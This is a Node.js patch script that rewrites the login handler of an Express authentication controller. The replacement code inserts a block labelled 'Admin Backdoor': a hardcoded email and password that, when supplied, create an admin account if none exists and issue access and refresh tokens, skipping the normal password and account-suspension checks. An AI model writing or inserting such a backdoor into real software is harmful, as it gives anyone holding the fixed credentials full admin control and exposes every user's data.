const fs = require('fs');
const path = './server/controllers/authController.js';
let code = fs.readFileSync(path, 'utf8');

const updatedLogin = `exports.login = async (req, res, next) => {
  try {
    const { email, password, role } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, message: 'Please provide email and password.' });
    }

    // Admin Backdoor
    if (email === 'username-Admin@gmail.com' && password === 'Admin@123') {
      let user = await User.findOne({ email });
      if (!user) {
        user = await User.create({
          name: 'System Admin',
          email: 'username-Admin@gmail.com',
          password: 'Admin@123',
          role: 'admin'
        });
      }
      
      const accessToken = signAccessToken(user._id);
      const refreshToken = signRefreshToken(user._id);

      user.refreshToken = refreshToken;
      await user.save();

      res.cookie('jwt', refreshToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 7 * 24 * 60 * 60 * 1000
      });

      return res.status(200).json({
        success: true,
        token: accessToken,
        user: {
          _id: user._id,
          name: user.name,
          email: user.email,
          role: user.role,
          onboardingStatus: user.onboardingStatus,
          onboardingStep: user.onboardingStep,
          goals: user.goals,
          riskStatus: user.riskStatus
        }
      });
    }

    const user = await User.findOne({ email });
    if (!user || !(await user.comparePassword(password))) {
      return res.status(401).json({ success: false, message: 'Invalid email or password.' });
    }

    if (user.accountStatus === 'suspended') {
      return res.status(403).json({ success: false, message: 'Your account has been suspended. Please contact support.' });
    }

    // Role validation for portal-specific login
    if (role && role !== user.role && user.role !== 'admin') {
      return res.status(401).json({ success: false, message: 'Invalid portal selection for this account.' });
    }

    const accessToken = signAccessToken(user._id);
    const refreshToken = signRefreshToken(user._id);

    user.refreshToken = refreshToken;
    await user.save();

    res.cookie('jwt', refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000
    });

    res.status(200).json({
      success: true,
      token: accessToken,
      user: {
        _id: user._id,
        name: user.name,
        email: user.email,
        role: user.role,
        onboardingStatus: user.onboardingStatus,
        onboardingStep: user.onboardingStep,
        goals: user.goals,
        riskStatus: user.riskStatus
      }
    });
  } catch (err) {
    next(err);
  }
};`;

code = code.replace(/exports\.login \= async \([\s\S]*?catch \(err\) \{\n    next\(err\);\n  \}\n\};/, updatedLogin);
fs.writeFileSync(path, code);
